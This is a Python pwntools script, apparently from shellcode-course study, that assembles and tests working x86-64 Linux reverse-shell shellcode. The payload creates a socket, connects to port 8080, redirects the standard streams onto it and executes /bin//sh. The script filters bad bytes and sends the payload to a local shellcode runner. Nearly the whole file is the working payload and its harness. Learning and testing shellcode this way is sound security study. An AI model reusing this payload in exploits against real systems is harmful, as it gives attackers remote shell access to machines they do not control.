#!/usr/bin/env python
# -*- coding: utf-8 -*-

# https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/

from pwn import *

RUN = True
# RUN = False
# DEBUG = True
DEBUG = False

context.clear(
    arch='amd64',
    terminal=['tmux', 'splitw', '-h']
)

if RUN:
    p = process(['./shellcode_runner'])
    if DEBUG:
        gdb.attach(p, gdbscript="""
            b *main+69
            c
            s
        """)

# hs//nib/ 0x68732f2f6e69622f
# 127.0.0.1,8080,2 0x0100007f901f0002
#     mov dword ptr [rsp-4], 0x0100007f
#     mov word ptr [rsp-6], 0x901f
#     mov word ptr [rsp-8], 0x2
#     sub rsp, 8
shellcode = asm("""
    xor rax, rax
    mov rdi, rax
    mov dil, 2
    xor rsi, rsi
    mov sil, 1
    xor rdx, rdx
    mov al, 41
    syscall
    mov rdi, rax
    xor rax, rax

    push rax
    xor rbx, rbx
    mov bx, 0x901f
    shl rbx, 0x10
    add rbx, 2
    push rbx

    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    xor rax, rax
    mov al, 42
    syscall

    mov rsi, rax
    mov al, 33
    syscall

    inc sil
    mov al, 33
    syscall

    inc sil
    mov al, 33
    syscall

    xor rbx, rbx
    push rbx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 59
    syscall
""")

print('-' * 50)
for c in [0x00, 0x0a, 0x0b, 0x0d, 0xff]:
    if c in shellcode:
        print(f'WARNING: {hex(c)} in shellcode!')

print(shellcode)
print(len(shellcode))

if RUN:
    p.sendline(shellcode)

    p.interactive()
